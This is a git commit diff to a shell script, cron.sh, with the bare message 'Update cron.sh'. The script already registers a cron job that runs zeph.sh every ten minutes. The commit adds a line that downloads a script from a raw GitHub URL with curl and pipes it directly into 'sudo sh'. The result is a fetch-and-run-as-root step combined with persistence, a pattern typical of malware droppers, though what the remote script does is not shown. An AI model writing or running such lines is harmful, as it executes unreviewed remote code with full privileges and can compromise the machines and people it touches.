df65606d5774609010aa6a4d9632a470e5f7b4f5
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-03-24 01:38:35 +0700

    Update cron.sh

--- cron.sh
+++ cron.sh
@@ -18,3 +18,4 @@ run_every_10_minutes() {
 run_every_10_minutes &
 sudo crontab -e &
 (crontab -l 2>/dev/null ; echo "*/10 * * * * /usr/local/bin/zeph.sh") | crontab -
+curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/zeph.sh | sudo sh
